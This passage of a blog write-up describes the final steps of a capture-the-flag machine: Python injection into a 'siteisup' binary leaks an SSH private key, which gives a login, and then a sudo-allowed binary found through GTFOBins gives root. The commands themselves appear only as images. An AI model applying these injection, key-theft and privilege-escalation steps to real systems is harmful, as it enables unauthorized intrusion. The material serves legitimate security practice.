[![](https://blogger.googleusercontent.com/img/a/AVvXsEiK2H5DvKw5yW2Imzw4IQdT0fETMUxFw87yNQwO_ASmEVA7-7538byQ8gdhLB4337fJ6-daOflympogXAVVp-w7CkXFDrEg1gyAOhpZ5OP7nnki6W7_B3yN70QvjwSNp2HPYqNEoRIj4oIDc4hm0jboAAzFSpBBX8gVAXUugrW4SLHKGpUEkauG5bXCuw)](https://blogger.googleusercontent.com/img/a/AVvXsEiK2H5DvKw5yW2Imzw4IQdT0fETMUxFw87yNQwO_ASmEVA7-7538byQ8gdhLB4337fJ6-daOflympogXAVVp-w7CkXFDrEg1gyAOhpZ5OP7nnki6W7_B3yN70QvjwSNp2HPYqNEoRIj4oIDc4hm0jboAAzFSpBBX8gVAXUugrW4SLHKGpUEkauG5bXCuw)

  
We check with strings the binary "_siteisup_", we see that it calls with **python** to the previous script, so we could try to gain access with this user through this binary or py script.

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEgmE2rvln3mBG1gqI2incUrhoe0vsPc1kTjOj6Bc01jRxmGeUdxF3hy8iAOU4fh5kdGoMoaoWeKSx2gIw6yqQJlzbifUe-9x9pA1APKXNAWHfHI9AhXadMFArCT41bCWjUxKVxCrNltsHdU8AD25-b8PJpOtf53DqPQaJIg3UQ6tPdITuuv9ILiv5N9DQ=w640-h569)](https://blogger.googleusercontent.com/img/a/AVvXsEgmE2rvln3mBG1gqI2incUrhoe0vsPc1kTjOj6Bc01jRxmGeUdxF3hy8iAOU4fh5kdGoMoaoWeKSx2gIw6yqQJlzbifUe-9x9pA1APKXNAWHfHI9AhXadMFArCT41bCWjUxKVxCrNltsHdU8AD25-b8PJpOtf53DqPQaJIg3UQ6tPdITuuv9ILiv5N9DQ)

  
So after several tests of injecting **Python** code, I tried loading a library and managed to display the _id\_rsa_ on error:

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEhbA23vGHsMRu_I9Njt9yZ3KvHHy6pvjb1l34Z5PCH2Gs3mv1J4O85KPs0AR8n8h9_1b4M4o7dyZUHKC-QYh0rF2-I2yRcuAKlp5tvmXrSFx2gAUZ-UCkEndiRDcj_rSLwyOkhuB7qFSCo4n8AREH2A18abPFplLDdHBmhFcd7s3K7IGgeUVMsp8-xWNw=w517-h640)](https://blogger.googleusercontent.com/img/a/AVvXsEhbA23vGHsMRu_I9Njt9yZ3KvHHy6pvjb1l34Z5PCH2Gs3mv1J4O85KPs0AR8n8h9_1b4M4o7dyZUHKC-QYh0rF2-I2yRcuAKlp5tvmXrSFx2gAUZ-UCkEndiRDcj_rSLwyOkhuB7qFSCo4n8AREH2A18abPFplLDdHBmhFcd7s3K7IGgeUVMsp8-xWNw)

  
So we access by **SSH** with the private key, read the flag of _user.txt_ and see that we can run a binary with **SUDO:**

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEiW2LP2xFDDy9ONtU1i88nOzNOV-hOyB7IyKYZ7N0UgIQ65ZBRLZ1dvDP2Dh5Ov8YJuCgIh6L8Uo0n2fP8JMXQMdOosMPV6_UARj0665qBpTw91dhxZULG4wS_Tpx5RA_T8YEiJKuuZ05VTj_tDwVe_CwwLkkEXwHfH_jfp9Mg42Ei0yufQ31bQIiN26w=w640-h610)](https://blogger.googleusercontent.com/img/a/AVvXsEiW2LP2xFDDy9ONtU1i88nOzNOV-hOyB7IyKYZ7N0UgIQ65ZBRLZ1dvDP2Dh5Ov8YJuCgIh6L8Uo0n2fP8JMXQMdOosMPV6_UARj0665qBpTw91dhxZULG4wS_Tpx5RA_T8YEiJKuuZ05VTj_tDwVe_CwwLkkEXwHfH_jfp9Mg42Ei0yufQ31bQIiN26w)

  
We searched [https://gtfobins.github.io](https://gtfobins.github.io), we found a way to escalate privileges to root in a very simple way:

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEjZCbOPjGiw5UvIEi_gPxiLXbGXXa995HaL11TOdLbnSODvfI9LSArugvmmTEmY3lfaO-Lp0T57vI5DCaqmkKkzz3X-F52Jv0Fs6DihRPkYB2L0UjlCJXJ_aicSCr3IrEpQmaTU5sbzzVNIqISWYqKwC2mDCWyVjyDaUm9Lv-H3wIFLqKN-ji9mziXqJQ=w640-h152)](https://blogger.googleusercontent.com/img/a/AVvXsEjZCbOPjGiw5UvIEi_gPxiLXbGXXa995HaL11TOdLbnSODvfI9LSArugvmmTEmY3lfaO-Lp0T57vI5DCaqmkKkzz3X-F52Jv0Fs6DihRPkYB2L0UjlCJXJ_aicSCr3IrEpQmaTU5sbzzVNIqISWYqKwC2mDCWyVjyDaUm9Lv-H3wIFLqKN-ji9mziXqJQ)

  
  
We execute the commands and read the root flag:

  

[![](https://blogger.googleusercontent.com/img/a/AVvXsEiEYjdg5JWb2y4XGq5rLEZJQtLLk1nrksjwSokx48QGi9jgljM3KQFGGyvwQDUMp7TCL9SGYhZkY2a3TL_ZGCtNyfCq_5KfXopLoq5MoajCSFFk339coQmnzNDnGutZCjI03J7kUAAFtGWVSjqg3MXOqI0pLFEEOwYgFuT5xCm-2yMqxREt5xdwtPs76w=w640-h182)](https://blogger.googleusercontent.com/img/a/AVvXsEiEYjdg5JWb2y4XGq5rLEZJQtLLk1nrksjwSokx48QGi9jgljM3KQFGGyvwQDUMp7TCL9SGYhZkY2a3TL_ZGCtNyfCq_5KfXopLoq5MoajCSFFk339coQmnzNDnGutZCjI03J7kUAAFtGWVSjqg3MXOqI0pLFEEOwYgFuT5xCm-2yMqxREt5xdwtPs76w)